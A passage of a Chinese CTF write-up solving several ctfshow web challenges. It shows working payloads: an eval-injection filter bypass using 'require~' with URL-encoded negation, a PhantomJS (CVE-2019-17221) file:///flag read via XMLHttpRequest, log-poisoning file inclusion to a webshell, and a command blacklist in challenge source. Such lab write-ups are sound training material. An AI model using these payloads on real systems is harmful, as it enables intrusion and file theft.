class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$secret_waf</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 清空 session 从头再来</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\$_SESSION[\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$code</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"]=false;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"27\"></td><td><pre> * When you feel that you are lost, do not give up, fight and move on.</pre></td></tr><tr><td data-num=\"28\"></td><td><pre> * Being a hacker is not easy, it requires effort and sacrifice.</pre></td></tr><tr><td data-num=\"29\"></td><td><pre> * But remember … we are legion!</pre></td></tr><tr><td data-num=\"30\"></td><td><pre> *  ————Deep CTF 2020</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>*/</span></span></pre></td></tr></table></figure><p>这里可以发现</p>\n<p>过滤了：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>0       200\tfalse\tfalse\t309\t\t&#x2F;&#x2F;309 为黑名单里面的符号，但不一定是全部，只是符号</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>2\t&quot;\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>4\t$\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>6\t&amp;\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>7\t&#39;\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>8\t(\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>9\t)\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>10\t*\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>15\t&#x2F;\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>18\t;\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>25\t\\\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>27\t^\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>29\t&#96;\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>31\t|\t200\tfalse\tfalse\t309\t</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>1\t!\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>3\t#\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>5\t%\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>11\t+\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>12\t,\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>13\t-\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>14\t.\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>16\t\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>17\t:\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>19\t&lt;\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>20\t&#x3D;\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>21\t&gt;\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>22\t?\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>23\t@\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>24\t[\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>26\t]\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>28\t_\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>30\t&#123;\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>32\t&#125;\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>33\t~\t200\tfalse\tfalse\t303\t</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>————————————————</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>版权声明：本文为 CSDN 博主「秋风瑟瑟...」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45628145&#x2F;article&#x2F;details&#x2F;106291794</pre></td></tr></table></figure><p>利用点为 <code>eval(&quot;\\$_SESSION[&quot; . $code . &quot;]=false;&quot;);</code>  由 <code>eval</code>  的特性，可以用分号分割命令，但由于 <code>;</code>  被过滤，这里采用 <code>?&gt;&lt;?</code>  代替。所以先闭合 <code>[</code> , 即 <code>code=]=1</code>  之后要读取前面提示的 <code>/flag.txt</code>  文件，但由于引号和括号均被过滤，不能使用分号、括号、空格，即不能使用 include，那么可以想到用 require 包含文件，由于可以使用 <code>~</code> ，那么可以使用该符号取反运算</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>得到 <code>%D0%99%93%9E%98%D1%8B%87%8B</code>  那么 payload:  <code>code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98%D1%8B%87%8B?&gt; </code></p>\n<p>提示</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/ctfshow_2.jpg\" alt=\"\" /># 本文作者： dpm12345 @dpm12345</p>\n<p>于是修改为 /flag</p>\n<p>得到 <code>%D0%99%93%9E%98</code></p>\n<p>那么 payload: <code>code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98?&gt;</code></p>\n<p>得到 flag</p>\n<h2 id=\"remoteimagedownloader\"><a class=\"anchor\" href=\"#remoteimagedownloader\">#</a> RemoteImageDownloader</h2>\n<p>CVE-2019-17221、PhantomJS 任意文件读取</p>\n<p>首先创建 <code>html</code>  写入以下代码：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> x<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> x<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span><span class=\"token operator\">=</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> x<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"file:///flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> x<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>再将站点地址输入，点击 <code>download</code> ，下载了图片，打开后看到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/romoteImageDownload.png\" alt=\"\" /></p>\n<h2 id=\"all_info_u_want\"><a class=\"anchor\" href=\"#all_info_u_want\">#</a> ALL_INFO_U_WANT</h2>\n<p>访问 index.php.bak 得到源码</p>\n<pre><code class=\"language-PHP\">visit all_info_u_want.php and you will get all information you want\n\n= =Thinking that it may be difficult, i decided to show you the source code:\n\n\n&lt;?php\nerror_reporting(0);\n\n//give you all information you want\nif (isset($_GET['all_info_i_want'])) &#123;\n    phpinfo();\n&#125;\n\nif (isset($_GET['file'])) &#123;\n    $file = &quot;/var/www/html/&quot; . $_GET['file'];\n    //really baby include\n    include($file);\n&#125;\n\n?&gt;\n\n\n\nreally really really baby challenge right?\n</code></pre>\n<p>根据提示访问 <code>all_info_u_want.php?all_info_i_want=1</code> ,</p>\n<p>之后是文件读取</p>\n<p>通过 <code>phpinfo ()</code>  可知为 nginx，那么可以使用日志包含写一句话木马进行 rce</p>\n<p>查找根目录，发现 flag，读取，但是是假的，用以下命令查找</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">find</span> /etc <span class=\"token parameter variable\">-name</span> <span class=\"token string\">\"*\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token string\">\"ctfshow\"</span></pre></td></tr></table></figure><p>找到 flag</p>\n<h2 id=\"wustctf_朴实无华_revenge\"><a class=\"anchor\" href=\"#wustctf_朴实无华_revenge\">#</a> WUSTCTF_朴实无华_Revenge</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Content-type:text/html;charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">isPalindrome</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$len</span><span class=\"token operator\">=</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$l</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$k</span><span class=\"token operator\">=</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$len</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$j</span><span class=\"token operator\">&lt;</span><span class=\"token variable\">$k</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$j</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$len</span><span class=\"token operator\">-</span><span class=\"token variable\">$j</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$l</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$l</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">//level 1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token variable\">$numPositve</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token variable\">$numReverse</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^0-9.-]/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"非洲欢迎你1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$numPositve</span> <span class=\"token operator\">&lt;=</span> <span class=\"token operator\">-</span><span class=\"token number\">999999999999999999</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$numPositve</span> <span class=\"token operator\">>=</span> <span class=\"token number\">999999999999999999</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 在 64 位系统中 intval () 的上限不是 2147483647 省省吧</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"非洲欢迎你2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$numPositve</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$numReverse</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">isPalindrome</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"金钱解决不了穷人的本质问题\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"去非洲吧\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">//level 2</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token variable\">$md5</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$md5</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$md5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"去非洲吧\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">//get flag</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get_flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get_flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"more\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tail\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"less\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"head\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"36dCTFShow\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token 